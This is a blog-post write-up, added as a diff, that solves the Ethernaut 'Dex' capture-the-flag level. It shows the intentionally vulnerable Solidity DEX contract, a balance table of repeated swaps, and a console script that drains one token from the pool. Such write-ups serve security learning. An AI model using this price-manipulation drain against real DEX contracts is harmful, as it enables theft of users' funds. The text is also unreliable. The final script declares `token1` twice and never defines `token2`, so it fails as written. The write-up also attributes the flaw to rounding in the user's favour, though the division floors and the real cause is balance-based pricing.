@@ -1,0 +1,125 @@
+---
+title: Ethernaut - Dex - Solution
+date: '2024-05-27'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Dex CTF
+---
+
+# Ethernaut - Dex - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+import "openzeppelin-contracts-08/access/Ownable.sol";
+
+contract Dex is Ownable {
+    address public token1;
+    address public token2;
+
+    constructor() {}
+
+    function setTokens(address _token1, address _token2) public onlyOwner {
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
+        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    }
+
+    function swap(address from, address to, uint256 amount) public {
+        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapPrice(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
+        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    }
+
+    function approve(address spender, uint256 amount) public {
+        SwappableToken(token1).approve(msg.sender, spender, amount);
+        SwappableToken(token2).approve(msg.sender, spender, amount);
+    }
+
+    function balanceOf(address token, address account) public view returns (uint256) {
+        return IERC20(token).balanceOf(account);
+    }
+}
+
+contract SwappableToken is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+```
+
+## Solution
+
+The goal of this challenge is to steal the entire balance of at least one of the two tokens from the dex.
+
+When executing the `swap()` function twice in a row, i.e., swapping 10 `token1` for 10 `token2` and subsequently swapping our entire balance of 20 `token2`, we notice that we receive 24 `token1`!
+This is because `getSwapPrice()` rounds in favor of the user rather than the protocol.
+In other words, we can drain one of the tokens from the dex entirely, simply by swapping the player's entire balance back and forth multiple times in a row.
+
+More specifically, we have the following table, where p1 and p2 are the player's balances of `token1` and `token2` and d1 and d2 are the dex's balances, respectively:
+
+| p1 | p2 | d1  | d2  | `swapAmount` for next swap |
+|----|----|-----|-----|----------------------------|
+| 10 | 10 | 100 | 100 | -                          |
+|  0 | 20 | 110 |  90 | 20 * 110 / 90 = 24         |
+| 24 |  0 |  86 | 110 | 24 * 110 / 86 = 30         |
+|  0 | 30 | 110 |  80 | 30 * 110 / 80 = 41         |
+| 41 |  0 |  69 | 110 | 41 * 110 / 69 = 65         |
+| 0  | 65 | 110 | 45  | 65 * 110 / 45 = 158        | 
+
+Notice that, if we were to swap the player's entire balance of 65 `token2` in the last of the above steps, we'd end up with 158 `token1` according to our table.
+This, however, would exceed the dex's `token1` balance!
+For this reason, we must swap an amount such that `swapAmount` becomes 110 instead of 158.
+In other words, we need to solve
+
+```
+x * 110 / 45 == 110
+```
+
+which tells us that our last swap needs to exchange 45 instead of 65 `token2`.
+This way, we ensure to get precisely 110 `token1` back, draining the entire `token1` balance from the dex.
+
+Lastly, notice that we need to first approve the dex for a sufficiently high amount of both `token1` and `token2` in order to execute the above sequence.
+Looking at the above table, we see that an allowance of 1000 is more than enough.
+
+As a summary, we can solve the level via the Ethernaut console as follows:
+
+```javascript
+const token1 = await contract.token1()
+const token1 = await contract.token1()
+
+await contract.approve(contract.address, 1000)
+
+await contract.swap(token1, token2, 10)
+await contract.swap(token2, token1, 20)
+await contract.swap(token1, token2, 24)
+await contract.swap(token2, token1, 30)
+await contract.swap(token1, token2, 41)
+
+await contract.swap(token2, token1, 45)
+```
